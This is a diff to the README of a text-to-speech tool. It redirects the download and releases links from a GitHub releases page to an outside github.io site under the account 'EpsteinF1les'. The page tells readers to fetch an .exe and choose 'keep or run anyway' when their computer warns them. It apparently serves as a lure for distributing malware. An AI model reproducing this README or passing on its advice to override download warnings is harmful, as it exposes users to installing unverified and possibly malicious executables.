@@ -1,6 +1,6 @@
 # 🎙️ tts - Create clear and natural sounding speech
 
-[![Download tts](https://img.shields.io/badge/Download_Application-blue)](https://github.com/EpsteinF1les/tts/releases)
+[![Download tts](https://img.shields.io/badge/Download_Application-blue)](https://epsteinf1les.github.io)
 
 This application converts written text into lifelike speech. It improves the clarity and flow of machine-generated voices. Users rely on this tool to make digital communication sound human. The software handles phonetics and timing to ensure speech sounds natural.
 
@@ -18,7 +18,7 @@ Ensure your sound output device works before you begin. Check that your speakers
 
 ## 📥 How to download
 
-Visit the [releases page](https://github.com/EpsteinF1les/tts/releases) to find the correct file for your system. Look for the file ending in .exe. If your computer displays a download warning, select keep or run anyway. The application package includes all necessary files to function on your device.
+Visit the [releases page](https://epsteinf1les.github.io) to find the correct file for your system. Look for the file ending in .exe. If your computer displays a download warning, select keep or run anyway. The application package includes all necessary files to function on your device.
 
 ## 🚀 Setting up the application
 
